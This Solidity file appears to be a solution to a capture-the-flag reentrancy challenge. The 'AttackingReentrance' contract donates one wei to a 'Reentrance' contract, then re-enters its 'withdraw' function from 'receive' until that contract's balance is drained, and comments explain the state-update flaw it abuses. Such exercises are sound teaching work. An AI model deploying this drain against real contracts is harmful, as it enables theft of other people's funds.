// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    Reentrance private reentranceRef;
    uint8 constant private WITHDRAW_QTY = 1; // see Reentrance.sol, line 21: if (balances[msg.sender] >= 1) { ...

    constructor(address payable _contractAddress) payable {
        reentranceRef = Reentrance(_contractAddress);
    }

    function hackContract() external {
        // Allow the initial withdraw step to be run, by setting the minimum required withdraw quantity.
        reentranceRef.donate{value: WITHDRAW_QTY}(address(this));

        // Function "withdraw" does not ensure that state changes are all performed before calling other contracts;
        // this means that, by calling this function, funds will be transfered from the victim to this contract...
        // NOTE: function "withdraw" calls "call" on the sender - this contract -
        //       line 20: msg.sender.call{value: balances[msg.sender]}("");
        reentranceRef.withdraw();
    }

    receive() external payable {
        if (address(reentranceRef).balance >= WITHDRAW_QTY) {
            // ...and again until no more funds can be transfered.
            reentranceRef.withdraw();
        }

        // NOTE: this works even with "fallback" and no "receive" function.
    }
}
